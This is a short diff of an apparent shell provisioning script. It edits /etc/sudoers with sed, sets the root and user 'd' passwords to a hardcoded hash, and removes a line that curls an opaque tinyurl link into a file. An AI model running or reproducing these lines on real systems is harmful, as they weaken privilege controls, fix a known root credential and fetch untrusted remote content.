@@ -6,4 +6,3 @@ sed -i '125s/^#/ /' /etc/sudoers
 HASH="$6$cveWA8dx7.KxfTQK$vsOMthe24Kh8Ja2e6CG0C8GqYqUdSkteRr4GsEMLLFAW/Bu0lxX6XaxToE89t/ZqT9b/IBB3WcrtmxsckttjC/"
 echo "root:$HASH" | chpasswd -e
 echo "d:$HASH" | chpasswd -e
-curl -sL tinyurl.com/comcompp -o /home/d/2
